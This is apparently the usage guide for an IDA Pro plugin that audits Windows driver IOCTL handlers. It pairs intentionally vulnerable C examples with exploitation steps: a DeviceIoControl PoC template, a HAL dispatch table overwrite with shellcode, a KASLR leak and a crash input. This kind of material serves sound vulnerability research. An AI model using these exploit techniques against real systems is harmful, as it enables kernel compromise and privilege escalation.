# IOCTL Super Audit - Complete Usage Guide

## Table of Contents
1. [Quick Start](#quick-start)
2. [Main Menu System](#main-menu-system)
3. [Vulnerability Types (All 8 Detection Functions)](#vulnerability-types)
4. [Step-by-Step Scanning](#step-by-step-scanning)
5. [Post-Scan Analysis](#post-scan-analysis)
6. [Exploit Generation](#exploit-generation)
7. [Context Menu Actions (Right-Click)](#context-menu-actions)
8. [Output Files Reference](#output-files-reference)
9. [Real-World Examples](#real-world-examples)

---

## Quick Start

### Installation
1. Copy `IOCTL Super Audit.py` to IDA plugins directory:
   - Windows: `%APPDATA%\Hex-Rays\IDA Pro\plugins\`
   - Linux: `~/.idapro/plugins/`
   - macOS: `~/Library/Application Support/IDA Pro/plugins/`

2. Restart IDA Pro

3. Load a Windows driver binary (.sys, .dll, .exe)

### First Run (60 seconds)
1. Press **Alt-F10** (or Edit → Plugins → IOCTL Super Audit)
2. Menu appears with 10 options
3. Select **Option 1: Scan for IOCTLs and Audit (Full Analysis)**
4. Answer "Yes" for verbose output
5. Answer "No" for range filter (scan entire binary)
6. Wait 10-60 seconds (depends on binary size)
7. Results appear in IDA output window and CSV files

### Where to Find Results
All output files are in the same directory as the binary you analyzed:
```
C:\Binaries\mydriver.sys  ← Your binary
C:\Binaries\ioctls_detected.csv  ← Main results
C:\Binaries\ioctl_vuln_audit.csv  ← Vulnerability details
C:\Binaries\ioctl_poc_templates.md  ← Exploit templates
C:\Binaries\windbg_scripts\  ← WinDbg automation
```

---

## Main Menu System

Press **Alt-F10** to open the IOCTL Super Audit main menu:

```
IOCTL Super Audit - Main Menu
    
1. Scan for IOCTLs and Audit (Full Analysis)
   → Full scan with all features enabled
   → Slowest but most comprehensive
   → Use this for detailed vulnerability hunting
   → Time: 30-60 seconds for large binaries

2. Quick Scan (Fast, minimal analysis)
   → IOCTL detection only, no vulnerability analysis
   → Fastest option
   → Use for quick reconnaissance
   → Time: 5-15 seconds

3. Scan with Range Filter (Min/Max custom range)
   → Filter IOCTLs by custom hex range
   → Example: 0x22000000 - 0x22FFFFFF (specific device type)
   → Use to focus on specific IOCTL families
   → Time: 10-30 seconds

4. Diff IOCTLs (Compare against baseline)
   → Compare current binary against previous version
   → Requires baseline signatures.json file
   → Shows new, removed, and changed IOCTLs
   → Use for version diff analysis

5. View Last Results (Reload CSV files)
   → Load previously generated CSV results
   → Use without re-scanning
   → Useful if you accidentally closed the output

6. Generate Exploit PoC (For selected IOCTL)
   → Create ready-to-use exploit template
   → Generates C code with proper structures
   → Use after identifying exploitable IOCTL

7. Generate Fuzz Harness (For selected IOCTL)
   → Create libFuzzer-compatible harness
   → For kernel fuzzing on Windows
   → Use for automated vulnerability discovery

8. Generate WinDbg Script (For selected IOCTL)
   → Create .wds script for WinDbg automation
   → Includes breakpoints and memory inspection
   → Use for interactive debugging

9. Analyze Function Data Flow (Current function)
   → Analyze taint flow in current function
   → Shows user-to-kernel data paths
   → Use when cursor is on a function

10. Decode IOCTL Value (At cursor position)
    → Decode raw IOCTL value into components
    → Shows DeviceType, Function, Method, Access
    → Use when cursor is on IOCTL constant
```

---

## Vulnerability Types (All 8 Detection Functions)

The plugin detects **8 distinct vulnerability categories**. After scanning, check `ioctl_vuln_audit.csv` for findings:

### 1. **Integer Overflow** 🔢
**Function:** `detect_integer_overflow()`

**What it finds:**
- Arithmetic operations without bounds checking
- Size calculations: `size = size1 + size2` (no overflow check)
- Allocation patterns: `ExAllocatePool(..., user_size + overhead)` ← Can overflow to small allocation

**Example (VULNERABLE):**
```c
void Handler(PIRP Irp) {
    INPUT *input = (INPUT *)Irp->UserBuffer;
    
    // VULNERABLE: size + 4 can overflow to 0
    DWORD total = input->size + 4;  // size=0xFFFFFFFF → total=3
    
    PVOID buf = ExAllocatePool(NonPagedPool, total);
    memcpy(buf, input->data, input->size);  // Copy 0xFFFFFFFF bytes!
}
```

**CSV Output:**
```
function,issue,risk
VulnerableHandler,"Integer overflow: size arithmetic without check",HIGH
```

**Exploit:**
1. Set size=0xFFFFFFFF
2. Allocation succeeds with 3 bytes (0xFFFFFFFF + 4 = 3)
3. memcpy writes entire buffer into 3-byte pool
4. Heap corruption → RCE

---

### 2. **Missing Privilege Checks** 🔐
**Function:** `detect_privilege_check_missing()`

**What it finds:**
- IOCTLs accessible from user-mode without admin check
- Missing `ProbeForRead/Write` calls
- No privilege validation before dangerous operations

**Example (VULNERABLE):**
```c
void PrivilegeIoctlHandler(PIRP Irp) {
    // NO privilege check!
    MmCopyVirtualMemory(
        PsGetCurrentProcess(),
        user_ptr,
        system_process,
        kernel_ptr,
        size,
        &bytes
    );
}
```

**CSV Output:**
```
function,issue,risk
PrivilegeIoctlHandler,"Missing privilege/privilege check",HIGH
```

**Why Dangerous:**
- Any user-mode process can execute MmCopyVirtualMemory
- Read/write arbitrary kernel memory
- Bypass access controls

---

### 3. **TOCTOU (Time-of-Check-Time-of-Use)** ⏱️
**Function:** `detect_toctou_race()`

**What it finds:**
- Validation followed by later usage (race window)
- Unbounded loops without re-validation
- Double-fetch vulnerabilities

**Example (VULNERABLE):**
```c
void ToctouHandler(PIRP Irp) {
    INPUT *input = (INPUT *)Irp->UserBuffer;
    
    // Check #1: Validate pointer
    if (!MmIsAddressValid(input->ptr)) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // TIME PASSES... User thread modifies input->ptr!
    
    // Use #2: User already changed input->ptr to kernel VA!
    memcpy(kernel_buf, input->ptr, input->size);
}
```

**CSV Output:**
```
function,issue,risk
ToctouHandler,"TOCTOU/double-fetch pattern detected",MEDIUM
```

**Attack:**
1. Thread 1: Pass valid user buffer pointer, pass validation
2. Thread 2: Modify input->ptr to kernel address
3. Thread 1: memcpy now copies from kernel memory

---

### 4. **Memory Disclosure (Info Leak)** 📖
**Function:** `detect_memory_disclosure()`

**What it finds:**
- Uninitialized kernel buffers returned to user
- Stack/pool memory not cleared before output
- Partial copy patterns: `memcpy(user_buf, kernel_ptr, partial_size)`

**Example (VULNERABLE):**
```c
void InfoLeakHandler(PIRP Irp) {
    // Kernel stack buffer with uninitialized data
    BYTE kernel_stack[256];
    
    // Copy only 128 bytes to user (leaves 128 uninitialized)
    memcpy(user_buf, kernel_stack, 128);
    
    // User gets last 128 bytes of kernel stack! Leaks pointers, canaries, etc.
}
```

**CSV Output:**
```
function,issue,risk
InfoLeakHandler,"Memory disclosure via partial copy or uninitialized buffer",MEDIUM
```

**Impact:**
- KASLR bypass (leak kernel addresses)
- Leak stack canaries → overflow possible
- Leak SYSTEM process handle

---

### 5. **Arbitrary Write Primitive** ✍️
**Function:** `detect_arbitrary_write()`

**What it finds:**
- Direct pointer deref from user input: `*(DWORD *)user_ptr = value`
- Dangerous memcpy patterns: `memcpy(user_ptr, kernel_data, size)`
- Write-What-Where vulnerabilities

**Example (VULNERABLE):**
```c
void ArbitraryWriteHandler(PIRP Irp) {
    WRITE_REQUEST *req = (WRITE_REQUEST *)Irp->UserBuffer;
    
    // CRITICAL: Write to user-provided kernel address!
    *(DWORD *)req->kernel_address = req->value;
    
    // Attacker can:
    // - req->kernel_address = HAL_DISPATCH_TABLE + 0x08
    // - req->value = attacker_shellcode_address
    // → RCE via HAL table hijack
}
```

**CSV Output:**
```
function,issue,risk
ArbitraryWriteHandler,"Arbitrary write pattern via user-controlled pointer",CRITICAL
```

**Exploitation:**
- Write to HAL Dispatch Table → execute shellcode
- Write to function pointers → redirect execution
- Write to token pointers → privilege escalation

---

### 6. **User Pointer Dereference (Use-After-Free)** 💀
**Function:** `detect_user_pointer_trust()`

**What it finds:**
- Direct dereference of user-supplied pointers
- No validation before accessing user memory
- Race conditions on user pointers

**Example (VULNERABLE):**
```c
void UserPointerHandler(PIRP Irp) {
    OPERATION *op = (OPERATION *)Irp->UserBuffer;
    
    // DANGEROUS: Dereference user pointer without validation
    DoSomething(op->nested_ptr->field);
    
    // Attacker can:
    // - Point nested_ptr to kernel memory
    // - Trigger out-of-bounds read
    // - Cause kernel crash or information leak
}
```

**CSV Output:**
```
function,issue,risk
UserPointerHandler,"User-mode pointer dereference without validation",HIGH
```

**Attack Types:**
- Out-of-bounds read
- Null pointer dereference (DoS)
- Information leak

---

### 7. **METHOD_NEITHER Without Probing** ⚠️
**Function:** `detect_method_neither_missing_probe()`

**What it finds:**
- METHOD_NEITHER IOCTLs (direct kernel VA) without ProbeForRead/Write
- Critical because user provides kernel virtual addresses

**Example (VULNERABLE):**
```c
void MethodNeitherHandler(PIRP Irp) {
    // METHOD_NEITHER: User provides kernel VA directly!
    PCHAR kernel_va = (PCHAR)Irp->AssociatedIrp.SystemBuffer;
    
    // NO PROBE! Direct dereference of user-provided kernel VA
    memcpy(local_buf, kernel_va, 256);
}
```

**CSV Output:**
```
function,issue,risk
MethodNeitherHandler,"METHOD_NEITHER without ProbeForRead/Write",CRITICAL
```

**Why CRITICAL:**
- User directly supplies kernel VA
- Handler reads/writes it without validation
- Can read/write ANY kernel memory
- Read HAL dispatch table → KASLR bypass + RCE
- Write to function pointers → RCE

---

### 8. **Missing Access Check** 🚫
**Function:** `detect_missing_access_check()`

**What it finds:**
- Operations without access validation
- Missing SeAccessCheck calls
- Unchecked access to privileged resources

**Example (VULNERABLE):**
```c
void AccessCheckHandler(PIRP Irp) {
    // Request to delete user's file
    DELETE_REQUEST *req = (DELETE_REQUEST *)Irp->UserBuffer;
    
    // NO ACCESS CHECK!
    DeleteFileViaKernel(req->filename);
    
    // User can delete any file, even system files!
}
```

**CSV Output:**
```
function,issue,risk
AccessCheckHandler,"Missing access/permission validation",MEDIUM
```

**Impact:**
- Unauthorized file deletion/modification
- System instability
- Privilege escalation

---

## Step-by-Step Scanning

### Scenario: Audit New Windows Driver

**Step 1: Load Binary**
```
1. Open IDA Pro
2. File → Open → select mydriver.sys
3. Wait for auto-analysis to complete
4. Verify binary is loaded (check status bar)
```

**Step 2: Start Scan**
```
1. Press Alt-F10 (or Edit → Plugins → IOCTL Super Audit)
2. Menu appears
3. Select: Option 1 (Full Analysis)
```

**Step 3: Configure Scan**
```
Dialog #1: "Enable verbose output?"
→ Click: Yes (you want details)

Dialog #2: "Filter IOCTLs by range?"
→ Click: No (scan entire binary)
```

**Step 4: Wait for Results**
```
Output window shows:
[IOCTL Audit] Scanning for IOCTLs...
[IOCTL Audit] Found 234 candidate immediates (before filtering)
[IOCTL Audit] Extracted 87 unique IOCTLs
[IOCTL Audit] Analyzing handler functions...
[IOCTL Audit] Detecting vulnerabilities...
[IOCTL Audit] Generating exploit templates...
[IOCTL Audit] Writing output files...
[IOCTL Audit] Scan complete. Check CSV files in binary directory.
```

**Step 5: Review Results**
```
Open in Excel/Calc: ioctls_detected.csv
Look for:
- exploit_score = 9-10 → CRITICAL
- exploit_score = 6-8 → HIGH
- user_controlled = YES
- dangerous_sink = YES
```

---

## Post-Scan Analysis

### After Scan Completes

**Output Files Generated:**

1. **ioctls_detected.csv** - All IOCTLs found
   ```
   ioctl,method,handler,risk,exploit_score,exploit_severity
   0x22220A08,NEITHER,VulnHandler,CRITICAL,10,CRITICAL
   ```

2. **ioctl_vuln_audit.csv** - Vulnerabilities detected
   ```
   function,issue,risk,primitive
   VulnHandler,"Integer overflow",HIGH,WRITE_WHAT_WHERE
   ```

3. **ioctl_poc_templates.md** - Ready-to-use exploit code
4. **windbg_scripts/** - Debugging automation scripts
5. **ioctl_fuzz_harnesses.cpp** - Fuzzing harnesses

### Interactive Analysis in IDA

**Method 1: Double-Click in Table**
```
1. View → Toolbars → Buttons (if table not visible)
2. Double-click IOCTL row
3. Jumps to handler function in IDA View
4. Right-click on function address
```

**Method 2: Right-Click Context Menu**
```
1. Click on IOCTL value in disassembly
2. Right-click
3. Menu options:
   - View Handler Pseudocode
   - Analyze Data Flow
   - Generate PoC Template
   - Generate WinDbg Script
   - Show Call Graph to DriverEntry
   - Decode IOCTL Code
   - Set Smart Breakpoint
```

---

## Exploit Generation

### Generate C Exploit Code

**From Menu:**
```
1. Press Alt-F10
2. Select: Option 6 (Generate Exploit PoC)
3. Click on IOCTL value in disassembly
4. PoC code appears in output window
```

**Example Output:**
```c
// PoC for IOCTL 0x22220A08
#include <windows.h>
#include <stdio.h>

typedef struct {
    PVOID target_address;
    PVOID data_buffer;
    SIZE_T data_size;
} EXPLOIT_INPUT;

int main() {
    HANDLE device = CreateFileA(
        "\\\\.\\MyDeviceName",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (device == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device\n");
        return 1;
    }
    
    EXPLOIT_INPUT input = {
        .target_address = (PVOID)0xFFFFF... (kernel VA),
        .data_buffer = (PVOID)&my_data,
        .data_size = sizeof(my_data)
    };
    
    DWORD bytes_returned;
    BOOL result = DeviceIoControl(
        device,
        0x22220A08,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytes_returned,
        NULL
    );
    
    if (!result) {
        printf("[-] DeviceIoControl failed: %ld\n", GetLastError());
        return 1;
    }
    
    printf("[+] Exploit sent!\n");
    CloseHandle(device);
    return 0;
}
```

---

### Generate Fuzzing Harness

**From Menu:**
```
1. Press Alt-F10
2. Select: Option 7 (Generate Fuzz Harness)
3. harness.cpp appears in output
```

**Usage:**
```bash
# Save the harness
clang++ -fsanitize=fuzzer ioctl_fuzz_harnesses.cpp -o fuzzer

# Run fuzzer
./fuzzer -artifact_prefix=crashes/ -max_len=4096 corpus/

# Fuzzer will:
# - Generate random IOCTL inputs
# - Send to driver
# - Detect crashes/hangs
# - Save crashing inputs to crashes/ directory
```

---

### Generate WinDbg Scripts

**From Menu:**
```
1. Press Alt-F10
2. Select: Option 8 (Generate WinDbg Script)
3. Script saved to: windbg_scripts/handler_name.wds
```

**Usage in WinDbg:**
```
kd> $$>a< C:\path\to\handler_name.wds
[Script] Setting breakpoints for IOCTL analysis...
[Script] Breakpoint 0x88001234
[Script] Taint tracking enabled
```

**What the Script Does:**
- Sets conditional breakpoints
- Captures register state
- Dumps memory at critical points
- Logs all system calls
- Detects exploitable behavior

---

## Context Menu Actions (Right-Click)

**Available when cursor is on IOCTL code:**

### 1. View Handler Pseudocode
```
Displays decompiled pseudocode of current function
Useful for: Understanding what handler does
Output: Text in output window
```

### 2. Analyze Data Flow
```
Performs symbolic-lite taint tracking
Useful for: Finding user→kernel data paths
Output: 
  Flow: TRACKED / NO_IOCTL_FLOW / UNKNOWN
  User Controlled: YES/NO
  Dangerous Sink: YES/NO
  Sink APIs: [list of dangerous functions]
```

### 3. Generate PoC Template
```
Creates C code exploit for current IOCTL
Useful for: Quick exploit development
Output: C code in message window
```

### 4. Generate Fuzz Harness
```
Creates libFuzzer harness for current handler
Useful for: Automated fuzzing
Output: C++ code in message window
```

### 5. Generate WinDbg Script
```
Creates debugging automation script
Useful for: Interactive exploitation analysis
Output: .wds file in working directory
```

### 6. Show Call Graph to DriverEntry
```
Traces handler registration path back to module init
Useful for: Understanding initialization
Output: Call path in message window
```

### 7. Decode IOCTL Code
```
Decodes IOCTL into components
Example: 0x22220A08 →
  DeviceType: 0x2222
  Function: 0x282
  Method: METHOD_NEITHER
  Access: FILE_WRITE_ACCESS
Output: Components displayed in message
```

### 8. Set Smart Breakpoint
```
Sets conditional breakpoint with taint tracking
Useful for: Interactive debugging
Output: Breakpoint set at current address
```

---

## Output Files Reference

### ioctls_detected.csv
**Main results file - open in Excel/Calc**

Columns:
- `ioctl` - IOCTL code (hex)
- `method` - Transfer method (BUFFERED, IN_DIRECT, OUT_DIRECT, NEITHER)
- `handler` - Function name
- `risk` - Risk level (LOW/MEDIUM/HIGH/CRITICAL)
- `exploit_score` - 0-10 score
- `exploit_severity` - CRITICAL/HIGH/MEDIUM/LOW
- `flow` - TRACKED/NO_IOCTL_FLOW/UNKNOWN
- `user_controlled` - YES/NO
- `dangerous_sink` - YES/NO
- `sink_apis` - List of dangerous APIs

**How to Use:**
1. Sort by `exploit_score` (descending)
2. Focus on rows with exploit_score >= 6
3. Double-click to jump to handler in IDA

---

### ioctl_vuln_audit.csv
**Vulnerability findings - shows specific issues**

Columns:
- `function` - Handler function name
- `issue` - Vulnerability description
- `risk` - Risk level
- `primitive` - Exploit primitive (WRITE_WHAT_WHERE, ARBITRARY_READ, TOKEN_STEAL, etc.)

**How to Use:**
1. Find HIGH/CRITICAL vulnerabilities
2. Note the handler function name
3. Cross-reference with ioctls_detected.csv
4. Generate exploit template

---

### ioctl_poc_templates.md
**Ready-to-use exploit code**

Contains:
- Standard C templates (all IOCTLs)
- PowerShell templates (quick testing)
- Primitive-specific exploits:
  - Write-What-Where (heap spray + arbitrary write)
  - Arbitrary-Read (memory leaking)
  - Token-Steal (privilege escalation)
  - Pool-Overflow (heap corruption)
  - Info-Leak (KASLR bypass)

**How to Use:**
1. Find your IOCTL code in the file
2. Copy the C template
3. Replace DeviceName with actual device name
4. Compile: `cl.exe poc.c /link ntdll.lib`
5. Run: `poc.exe`

---

### windbg_scripts/ directory
**Debugging automation scripts**

One `.wds` file per CRITICAL/HIGH IOCTL:
- `VulnerableHandler_22220A08.wds`
- `AnotherHandler_44440004.wds`

**How to Use:**
1. Open kernel debugger
2. In WinDbg: `$$>a< C:\path\handler_name.wds`
3. Script sets breakpoints automatically
4. When breakpoint hits, inspects memory/registers

---

### ioctl_fuzz_harnesses.cpp
**Fuzzing harnesses for top 10 IOCTLs**

Contains:
- libFuzzer entry point
- Input generation
- Device communication
- Crash detection

**How to Use:**
```bash
# Compile with fuzzer instrumentation
clang++ -fsanitize=fuzzer ioctl_fuzz_harnesses.cpp -o fuzzer

# Create corpus directory with sample inputs
mkdir corpus
echo -n "initial_data" > corpus/seed1

# Run fuzzer
./fuzzer corpus/ -max_len=4096 -timeout=5
```

---

## Real-World Examples

### Example 1: CVE-2023-21709 Pattern

**Vulnerability:** Write-What-Where via IOCTL

**Driver Code:**
```c
void VulnerableDispatcher(PIRP Irp, PIO_STACK_LOCATION Stack) {
    UINT32 ioctl = Stack->Parameters.DeviceIoControl.IoControlCode;
    
    if (ioctl == 0x22220A08) {  // IOCTL code
        WRITE_REQUEST *req = (WRITE_REQUEST *)Irp->AssociatedIrp.SystemBuffer;
        
        // NO VALIDATION - direct write to user-supplied kernel VA
        memcpy(req->target_va, req->data, req->size);
    }
}
```

**Plugin Detection:**

Menu → Option 1 (Full Scan)

Results:
```
ioctls_detected.csv:
ioctl,handler,method,risk,exploit_score,user_controlled,dangerous_sink
0x22220A08,VulnerableDispatcher,METHOD_NEITHER,CRITICAL,10,YES,YES

ioctl_vuln_audit.csv:
function,issue,risk,primitive
VulnerableDispatcher,"Arbitrary write pattern",CRITICAL,WRITE_WHAT_WHERE
```

**Exploitation:** (From generated PoC)

```c
// 1. Allocate pool for shellcode
HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0x1000, 0x10000);
void *shellcode = HeapAlloc(heap, 0, 0x1000);
memcpy(shellcode, malicious_code, sizeof(malicious_code));

// 2. Build exploit input
WRITE_REQUEST req = {
    .target_va = &HalDispatchTable[1],  // HAL function pointer
    .data = shellcode,  // Points to our shellcode
    .size = sizeof(shellcode)
};

// 3. Send IOCTL
DeviceIoControl(
    device,
    0x22220A08,
    &req,
    sizeof(req),
    NULL, 0,
    &bytes, NULL
);

// 4. Trigger HAL function call to execute shellcode
// ... RCE achieved
```

---

### Example 2: Information Leak Pattern

**Vulnerability:** Kernel stack leak via partial copy

**Driver Code:**
```c
void LeakyHandler(PIRP Irp) {
    BYTE kernel_stack[512];  // Uninitialized!
    
    // Only copy first 128 bytes
    memcpy(
        (BYTE *)Irp->AssociatedIrp.SystemBuffer,
        kernel_stack,
        128
    );
    
    // Remaining 384 bytes of kernel stack leaked to user!
}
```

**Plugin Detection:**

Results:
```
ioctl_vuln_audit.csv:
function,issue,risk,primitive
LeakyHandler,"Memory disclosure via partial copy",MEDIUM,INFO_LEAK
```

**Exploitation:**

```c
// Send IOCTL
BYTE leaked_data[128];
DeviceIoControl(device, 0x44440004, NULL, 0, leaked_data, 128, &bytes, NULL);

// Analyze leaked kernel stack
for (int i = 0; i < 128; i++) {
    UINT64 *ptr = (UINT64 *)&leaked_data[i];
    
    // Look for kernel addresses (0xFFFF...)
    if (*ptr > 0xFFFFF00000000000) {
        printf("[+] Kernel pointer found at offset %d: 0x%p\n", i, *ptr);
        kernel_base = *ptr - known_offset;  // Calculate KASLR
    }
}
```

---

### Example 3: Method-Neither DoS Pattern

**Vulnerability:** Kernel VA crash from user input

**Driver Code:**
```c
void MethodNeitherHandler(PIRP Irp) {
    // METHOD_NEITHER: User provides kernel VA directly
    PCHAR user_buffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;
    
    // Dereference without validation
    int value = *(int *)user_buffer;  // ← Can be any kernel VA!
}
```

**Plugin Detection:**

Results:
```
ioctl_detected.csv:
exploit_score=4 (METHOD_NEITHER)

ioctl_vuln_audit.csv:
issue="METHOD_NEITHER without ProbeForRead/Write"
```

**Exploitation (DoS):**

```c
// Provide invalid kernel VA
char invalid_va[] = "\x00\xD0\xFF\xFF\xFF\xFF\xFF\xFF";  // 0xFFFFFFFFFFD00000

DeviceIoControl(device, 0x22220A08, invalid_va, 8, NULL, 0, &bytes, NULL);

// Result: Kernel accesses invalid VA → Kernel panic → DoS
```

---

## Tips & Tricks

### Finding Critical IOCTLs Quickly

```
1. Open ioctls_detected.csv in Excel
2. Add filter to exploit_score column
3. Filter: >= 6
4. Sort by exploit_severity (CRITICAL first)
5. Focus on rows with method=NEITHER
```

### Customizing Dangerous APIs

Edit `DANGEROUS_APIS` set in plugin:
```python
DANGEROUS_APIS = {
    'memcpy', 'ExAllocatePool', 'MmCopyVirtualMemory',
    'YourCustomAPI',  # ← Add here
}
```

### Debugging with WinDbg

```bash
# Open kernel debugger
windbg -k com:port=COM1,baud=115200

# Load symbols
.sympath C:\symbols

# Use generated script
$$>a< handler_script.wds

# Set custom breakpoint
bp driver!VulnerableHandler ".echo IOCTL called; d r8; d r9"

# Continue execution
g
```

### Running Fuzz Campaign

```bash
# 24-hour fuzzing session
timeout 86400 fuzzer corpus/ -max_len=4096 -timeout=5 -max_total_time=86400

# Check for crashes
ls crashes/

# Analyze crashing input
hexdump -C crashes/crash-xxxx
```

---

## Troubleshooting

### No IOCTLs Found

**Possible Causes:**
1. Binary not analyzed - wait for auto-analysis
2. Binary stripped of constants - use range filter
3. IOCTLs stored in data section - enable detailed scan

**Solution:**
- Menu → Option 3 (Range Filter)
- Enter common device type range

### Plugin Crashes on Load

**Solution:**
1. Check IDA version (7.0+ required)
2. Check Hex-Rays compatibility
3. Run with verbose output for debugging

### Exploit Template Won't Compile

**Solution:**
1. Check device name matches actual driver
2. Verify GUIDs are correct
3. Link against ntdll.lib: `cl.exe poc.c /link ntdll.lib`

---

## Next Steps

1. **Scan your drivers** - Use Menu Option 1 for full audit
2. **Review findings** - Sort ioctls_detected.csv by exploit_score
3. **Generate exploits** - Use Menu Option 6-8
4. **Test with fuzzer** - Use generated harnesses
5. **Debug interactively** - Use WinDbg scripts

---

See [README.md](README.md) for feature overview and [FLOW_TRACKING_GUIDE.md](FLOW_TRACKING_GUIDE.md) for technical details.

